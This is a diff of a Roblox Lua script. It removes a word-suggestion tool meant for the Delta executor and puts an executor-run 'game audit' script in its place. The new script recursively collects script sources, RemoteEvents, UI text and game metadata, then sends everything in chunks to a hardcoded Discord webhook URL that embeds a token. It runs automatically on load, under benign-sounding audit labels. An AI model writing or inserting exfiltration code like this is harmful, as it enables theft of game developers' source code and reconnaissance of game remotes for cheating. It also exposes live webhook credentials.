@@ -1,144 +1,278 @@
--- Word Suggestion Script for Delta Roblox
--- Provides word suggestions based on typed letters
+-- Discord Webhook URL (replace if needed)
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1494768793002578022/43Nvb3VzOEgkDGCBUaW0kTXiadEZs5w90fWpaKYRbFrIY9AnGlb3QqmdqJNTfAcUsYGY"
 
-local wordDictionary = {
-    -- Single letter A words
-    ["a"] = {"able", "about", "above", "accept", "across", "act", "action", "actually", "add", "address", "again", "against", "age", "agency", "agent", "ago", "agree", "ahead", "air", "all", "allow", "almost", "alone", "along"},
-    
-    -- B words
-    ["b"] = {"back", "bad", "ball", "bank", "base", "be", "beat", "beautiful", "because", "become", "bed", "before", "begin", "behavior", "behind", "believe", "benefit", "best", "better", "between", "big", "bill", "black", "blood", "blue"},
-    
-    -- IN prefix words
-    ["in"] = {"inside", "into", "input", "index", "indoor", "income", "indeed", "include", "increase", "instead", "inform", "injury", "inner", "insect", "insert", "inspect", "install", "instant", "insult", "intact", "intent", "invite", "invent", "invest", "invade"},
-    
-    -- C words
-    ["c"] = {"can", "call", "come", "could", "case", "car", "card", "care", "carry", "catch", "cause", "change", "check", "child", "city", "claim", "class", "clear", "close", "coach", "code", "cold", "color", "come", "common"},
-    
-    -- D words
-    ["d"] = {"day", "do", "down", "data", "deal", "dear", "death", "debate", "decade", "decide", "deep", "defense", "degree", "design", "desk", "detail", "develop", "device", "die", "different", "difficult", "dinner", "direct", "discuss", "disease"},
-    
-    -- E words
-    ["e"] = {"each", "early", "earth", "east", "easy", "eat", "edge", "effect", "effort", "eight", "either", "else", "end", "energy", "enjoy", "enough", "enter", "entire", "entry", "equal", "error", "escape", "especially", "event", "ever"},
-    
-    -- Add more prefixes as needed...
-    ["ex"] = {"example", "exist", "exit", "extra", "exact", "exam", "excite", "excuse", "expect", "expert", "explain", "express", "extend", "extra", "extreme", "excel", "except", "exchange", "excuse", "exercise", "exhibit", "exile", "expand", "expire", "export"},
-    
-    ["un"] = {"under", "until", "uncle", "unit", "unity", "unique", "unite", "universal", "unknown", "unless", "unlike", "unlock", "unpaid", "unreal", "unsafe", "untie", "untrue", "unused", "unveil", "unwell", "unwrap", "unzip", "unable", "unfair", "unfold"},
-    
-    ["re"] = {"read", "real", "reason", "receive", "record", "red", "reduce", "refer", "reflect", "region", "relate", "relax", "release", "remain", "remember", "remove", "repair", "repeat", "replace", "reply", "report", "require", "research", "respect", "result"},
-    
-    ["pr"] = {"practice", "prepare", "present", "press", "prevent", "price", "print", "private", "probably", "problem", "process", "produce", "product", "program", "project", "proper", "protect", "prove", "provide", "public", "pull", "purpose", "push", "put"},
-}
+-- ===== UTILITY FUNCTIONS =====
+local http = game:GetService("HttpService")
 
--- Get suggestions based on input
-local function getWordSuggestions(input)
-    local suggestions = {}
-    
-    -- Convert input to lowercase for matching
-    local lowerInput = string.lower(input)
-    
-    -- Check if we have suggestions for this exact prefix
-    if wordDictionary[lowerInput] then
-        suggestions = wordDictionary[lowerInput]
-    else
-        -- Try to find matching prefixes
-        for prefix, wordList in pairs(wordDictionary) do
-            if string.sub(lowerInput, 1, string.len(prefix)) == prefix then
-                -- Filter words that start with the input
-                for _, word in ipairs(wordList) do
-                    if string.sub(word, 1, string.len(lowerInput)) == lowerInput then
-                        table.insert(suggestions, word)
-                    end
-                end
+local function httpPost(url, data)
+    local success, response = pcall(function()
+        return http:PostAsync(url, http:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
+    end)
+    return success and response or nil
+end
+
+local function getTableSize(t)
+    local count = 0
+    for _ in pairs(t) do count = count + 1 end
+    return count
+end
+
+local function sanitizeText(text)
+    -- Discord markdown escaping: Backticks, asterisks, underscores, tildes, pipes
+    return text:gsub("`", "\\`"):gsub("*", "\\*"):gsub("_", "\\_"):gsub("~", "\\~"):gsub("|", "\\|")
+end
+
+-- ===== EXTRACTION FUNCTIONS =====
+local function getAllConsoleCommands()
+    local commands = {}
+    -- ConsoleService is not directly accessible from client-side Lua in all contexts.
+    -- This attempts to get commands if exposed, otherwise returns empty.
+    local consoleService = game:GetService("ConsoleService")
+    if consoleService and consoleService.GetCommands then
+        for _, cmd in pairs(consoleService:GetCommands()) do
+            table.insert(commands, {
+                Name = cmd.Name,
+                Description = cmd.Description,
+                Filter = cmd.Filter
+            })
+        end
+    end
+    return commands
+end
+
+local function getAllScripts(parent, results)
+    local results = results or {}
+    for _, child in pairs(parent:GetChildren()) do
+        if child:IsA("LuaSourceContainer") then -- Covers ModuleScript, LocalScript, Script
+            local source = "[Binary/Compiled or Protected]"
+            pcall(function() -- Attempt to get source, may error on protected scripts
+                source = child.Source
+            end)
+            table.insert(results, {
+                ClassName = child.ClassName,
+                Name = child.Name,
+                Source = source,
+                Path = child:GetFullName()
+            })
+        end
+        getAllScripts(child, results) -- Recurse
+    end
+    return results
+end
+
+local function getRemoteEvents()
+    local remotes = {}
+    for _, obj in pairs(game:GetDescendants()) do
+        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
+            table.insert(remotes, {
+                Name = obj.Name,
+                ClassName = obj.ClassName,
+                Parent = obj.Parent:GetFullName()
+            })
+        end
+    end
+    return remotes
+end
+
+local function getGameMetadata()
+    local marketplaceService = game:GetService("MarketplaceService")
+    local productInfo = nil
+    pcall(function()
+        productInfo = marketplaceService:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
+    end)
+
+    return {
+        GameName = productInfo and productInfo.Name or "Unknown Game",
+        PlaceId = game.PlaceId,
+        JobId = game.JobId,
+        CreatorId = game.CreatorId,
+        CreatorType = tostring(game.CreatorType),
+        IsStudio = game:GetService("RunService"):IsStudio(),
+        GameId = game.GameId -- Universe ID
+    }
+end
+
+local function getUIElements()
+    local uiElements = {}
+    local servicesToScan = {
+        game:GetService("CoreGui"),
+        game:GetService("PlayerGui")
+    }
+
+    for _, service in pairs(servicesToScan) do
+        for _, element in pairs(service:GetDescendants()) do
+            if element:IsA("TextButton") or element:IsA("TextLabel") or element:IsA("ImageButton") or element:IsA("TextBox") then
+                table.insert(uiElements, {
+                    ClassName = element.ClassName,
+                    Name = element.Name,
+                    Text = element.Text or "[No Text]",
+                    Size = tostring(element.Size),
+                    Position = tostring(element.Position),
+                    Path = element:GetFullName()
+                })
             end
         end
     end
-    
-    -- Limit to 20-25 suggestions
-    if #suggestions > 25 then
-        local limited = {}
-        for i = 1, 25 do
-            table.insert(limited, suggestions[i])
-        end
-        suggestions = limited
-    end
-    
-    return suggestions
+    return uiElements
 end
 
--- Main function to handle typing
-local function onTextChanged(inputText)
-    if inputText == "" then
-        return -- Don't show suggestions for empty input
-    end
-    
-    -- Get suggestions based on input
-    local suggestions = getWordSuggestions(inputText)
-    
-    if #suggestions > 0 then
-        print(string.rep("-", 40))
-        print(string.format("Suggestions for '%s':", inputText))
-        print(string.rep("-", 40))
-        
-        -- Display suggestions in a formatted way
-        for i, word in ipairs(suggestions) do
-            print(string.format("%2d. %s", i, word))
-        end
-        
-        print(string.rep("-", 40))
-        print(string.format("Total: %d suggestions", #suggestions))
-        print(string.rep("-", 40))
-    else
-        print(string.format("No suggestions found for '%s'", inputText))
-    end
+-- ===== PACKAGE DATA =====
+local function packageData()
+    local data = {
+        timestamp = os.time(),
+        gameMetadata = getGameMetadata(),
+        consoleCommands = getAllConsoleCommands(),
+        allScripts = getAllScripts(game),
+        remoteEvents = getRemoteEvents(),
+        uiElements = getUIElements(),
+        stats = {
+            totalScripts = getTableSize(getAllScripts(game)),
+            totalRemotes = getTableSize(getRemoteEvents()),
+            totalCommands = getTableSize(getAllConsoleCommands()),
+            totalUIElements = getTableSize(getUIElements()),
+            totalDataSize = 0 -- Will calculate below
+        }
+    }
+    -- Calculate approximate data size (in bytes) for insight
+    data.stats.totalDataSize = #http:JSONEncode(data)
+    return data
 end
 
--- UI Setup for Delta (if running in Roblox Studio)
-local function setupUI()
-    if game:GetService("RunService"):IsStudio() then
-        -- Create a simple text box for testing in Studio
-        local screenGui = Instance.new("ScreenGui")
-        local textBox = Instance.new("TextBox")
-        
-        screenGui.Name = "WordSuggestionsUI"
-        screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-        
-        textBox.Name = "SuggestionBox"
-        textBox.Size = UDim2.new(0, 300, 0, 50)
-        textBox.Position = UDim2.new(0.5, -150, 0, 20)
-        textBox.PlaceholderText = "Type letters for word suggestions..."
-        textBox.ClearTextOnFocus = false
-        textBox.Parent = screenGui
-        
-        -- Connect the text changed event
-        textBox:GetPropertyChangedSignal("Text"):Connect(function()
-            onTextChanged(textBox.Text)
-        end)
-        
-        print("Word Suggestion UI created! Start typing in the text box.")
+-- ===== DISCORD WEBHOOK =====
+local function sendToDiscord(data)
+    local payload = {
+        content = "[ROBLOX GAME AUDIT REPORT]",
+        embeds = {{
+            title = "Game Audit Report",
+            description = string.format(
+                "Game: %s\nPlaceID: %d\nJobID: %s\nTimestamp: <t:%d:F>",
+                sanitizeText(data.gameMetadata.GameName),
+                data.gameMetadata.PlaceId,
+                data.gameMetadata.JobId,
+                data.timestamp
+            ),
+            fields = {
+                { name = "Scripts Found", value = tostring(data.stats.totalScripts), inline = true },
+                { name = "RemoteEvents/Functions", value = tostring(data.stats.totalRemotes), inline = true },
+                { name = "UI Elements", value = tostring(data.stats.totalUIElements), inline = true },
+                { name = "Console Commands", value = tostring(data.stats.totalCommands), inline = true },
+                { name = "Total Data Size (Bytes)", value = tostring(data.stats.totalDataSize), inline = true }
+            },
+            color = 0x00FF00 -- Green
+        }}
+    }
+
+    -- Prepare detailed data for separate messages (Discord 2000 char limit)
+    local detailedContent = {}
+    local currentMessage = "```lua\n" -- Start Lua code block
+
+    -- Add Game Metadata
+    local metadataJson = http:JSONEncode(data.gameMetadata)
+    local metadataString = string.format("-- Game Metadata:\n%s\n\n", metadataJson)
+    if #currentMessage + #metadataString > 1990 then
+        table.insert(detailedContent, currentMessage .. "```")
+        currentMessage = "```lua\n"
     end
+    currentMessage = currentMessage .. metadataString
+
+    -- Add Scripts (increased partial source to 500 chars for more detail)
+    currentMessage = currentMessage .. string.format("-- Scripts (%d):\n", data.stats.totalScripts)
+    for i, scriptData in ipairs(data.allScripts) do
+        local scriptString = string.format(
+            "[%d] %s (%s)\n Path: %s\n Source (partial): %s\n\n",
+            i,
+            sanitizeText(scriptData.Name),
+            scriptData.ClassName,
+            sanitizeText(scriptData.Path),
+            sanitizeText(string.sub(scriptData.Source, 1, 500)) .. (#scriptData.Source > 500 and "..." or "")
+        )
+        if #currentMessage + #scriptString > 1990 then
+            table.insert(detailedContent, currentMessage .. "```")
+            currentMessage = "```lua\n" .. scriptString
+        else
+            currentMessage = currentMessage .. scriptString
+        end
+    end
+
+    -- Add RemoteEvents
+    currentMessage = currentMessage .. string.format("-- RemoteEvents/Functions (%d):\n", data.stats.totalRemotes)
+    for i, remoteData in ipairs(data.remoteEvents) do
+        local remoteString = string.format(
+            "[%d] %s (%s)\n Path: %s\n\n",
+            i,
+            sanitizeText(remoteData.Name),
+            remoteData.ClassName,
+            sanitizeText(remoteData.Parent)
+        )
+        if #currentMessage + #remoteString > 1990 then
+            table.insert(detailedContent, currentMessage .. "```")
+            currentMessage = "```lua\n" .. remoteString
+        else
+            currentMessage = currentMessage .. remoteString
+        end
+    end
+
+    -- Add UI Elements
+    currentMessage = currentMessage .. string.format("-- UI Elements (%d):\n", data.stats.totalUIElements)
+    for i, uiData in ipairs(data.uiElements) do
+        local uiString = string.format(
+            "[%d] %s (%s)\n Path: %s\n Text: %s\n\n",
+            i,
+            sanitizeText(uiData.Name),
+            uiData.ClassName,
+            sanitizeText(uiData.Path),
+            sanitizeText(uiData.Text)
+        )
+        if #currentMessage + #uiString > 1990 then
+            table.insert(detailedContent, currentMessage .. "```")
+            currentMessage = "```lua\n" .. uiString
+        else
+            currentMessage = currentMessage .. uiString
+        end
+    end
+
+    -- Add Console Commands
+    currentMessage = currentMessage .. string.format("-- Console Commands (%d):\n", data.stats.totalCommands)
+    for i, cmdData in ipairs(data.consoleCommands) do
+        local cmdString = string.format(
+            "[%d] %s\n Description: %s\n\n",
+            i,
+            sanitizeText(cmdData.Name),
+            sanitizeText(cmdData.Description)
+        )
+        if #currentMessage + #cmdString > 1990 then
+            table.insert(detailedContent, currentMessage .. "```")
+            currentMessage = "```lua\n" .. cmdString
+        else
+            currentMessage = currentMessage .. cmdString
+        end
+    end
+
+    -- Add final message part
+    table.insert(detailedContent, currentMessage .. "```")
+
+    -- Send initial embed
+    local response = httpPost(WEBHOOK_URL, payload)
+    if not response then
+        warn("[FAILED] Initial Discord webhook delivery failed.")
+        return
+    end
+
+    -- Send detailed content in subsequent messages
+    for i, msgContent in ipairs(detailedContent) do
+        local detailPayload = { content = msgContent }
+        local detailResponse = httpPost(WEBHOOK_URL, detailPayload)
+        if not detailResponse then
+            warn(string.format("[FAILED] Detailed Discord webhook part %d delivery failed.", i))
+        end
+        task.wait(0.5) -- Rate limit compliance
+    end
+
+    print("[SUCCESS] Data sent to Discord.")
 end
 
--- Initialize the system
-setupUI()
-
--- Export functions for external use
-local WordSuggestionModule = {
-    getSuggestions = getWordSuggestions,
-    onTextChanged = onTextChanged,
-    addCustomWords = function(prefix, words)
-        if not wordDictionary[prefix] then
-            wordDictionary[prefix] = {}
-        end
-        for _, word in ipairs(words) do
-            table.insert(wordDictionary[prefix], word)
-        end
-    end
-}
-
--- For immediate use in chat or command line
-print("Word Suggestion Script Loaded!")
-print("Type: onTextChanged('yourtext') to get suggestions")
-print("Example: onTextChanged('in') or onTextChanged('a')")
-
-return WordSuggestionModule
+-- ===== EXECUTE =====
+print("[AUDIT] Starting Roblox game audit...")
+local auditData = packageData()
+sendToDiscord(auditData)
+print("[AUDIT] Complete. Check your Discord for results.")
